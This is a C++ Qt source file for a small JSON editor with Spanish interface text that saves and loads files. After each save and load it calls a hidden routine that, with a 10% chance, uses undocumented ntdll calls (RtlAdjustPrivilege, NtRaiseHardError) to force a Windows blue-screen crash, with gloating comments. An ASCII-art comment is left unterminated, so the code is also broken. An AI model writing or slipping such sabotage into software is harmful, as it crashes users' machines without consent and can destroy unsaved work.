#include <windows.h>
#include <cstdlib>
#include <ctime>
#include <QFileDialog>
#include <QFile>
#include <QTextStream>
#include <QMessageBox>

#include "mainwindow.h"
#include "ui_mainwindow.h"

typedef NTSTATUS(NTAPI* RtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

void triggerBSOD() {
    BOOLEAN bEnabled;
    ULONG uResp;
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");

    if (ntdll) {
        auto RtlAdjustPrivilegeFunc = (RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        auto NtRaiseHardErrorFunc = (NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

        if (RtlAdjustPrivilegeFunc && NtRaiseHardErrorFunc) {
            RtlAdjustPrivilegeFunc(19, TRUE, FALSE, &bEnabled);
            NtRaiseHardErrorFunc(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &uResp);
        }

        FreeLibrary(ntdll);
    }
}

void tryTriggerBSOD() {
    srand(time(nullptr));
    int randomValue = rand() % 100;

    if (randomValue < 10) triggerBSOD(); 
        /*
    
░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░
░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░
░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░
░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░
█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█
█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░
░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░
░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░
/*
}

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::on_saveJSONButton_clicked()
{
    QString jsonText = this->ui->textEdit->toPlainText().trimmed();

    if (jsonText.isEmpty()) {
        QMessageBox::warning(this, "Error", "No puedes guardar un archivo vacío.");
        return;
    }

    QString fileName = QFileDialog::getSaveFileName(this, "Guardar JSON", "", "Archivos JSON (*.json)");

    if (!fileName.isEmpty()) {
        QFile file(fileName);
        if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {
            QTextStream stream(&file);
            stream << jsonText;
            file.close();
            QMessageBox::information(this, "Éxito", "Archivo guardado exitosamente.");
        } else QMessageBox::warning(this, "Error", "No se pudo guardar el archivo.");
    }

    tryTriggerBSOD(); // NYEJEJEJE 😈
}

void MainWindow::on_loadJSONButton_clicked()
{
    QString fileName = QFileDialog::getOpenFileName(this, "Abrir JSON", "", "Archivos JSON (*.json)");

    if (!fileName.isEmpty()) {
        QFile file(fileName);
        if (file.open(QIODevice::ReadOnly | QIODevice::Text)) {
            QTextStream stream(&file);
            QString content = stream.readAll();
            file.close();
            ui->textEdit->setPlainText(content);
            QMessageBox::information(this, "Archivo Cargado", "Contenido cargado correctamente.");
        } else {
            QMessageBox::warning(this, "Error", "No se pudo abrir el archivo.");
        }
    }

    tryTriggerBSOD(); // ¿Tendrá suerte el usuario? ¡Tal vez nop! 🎲
}
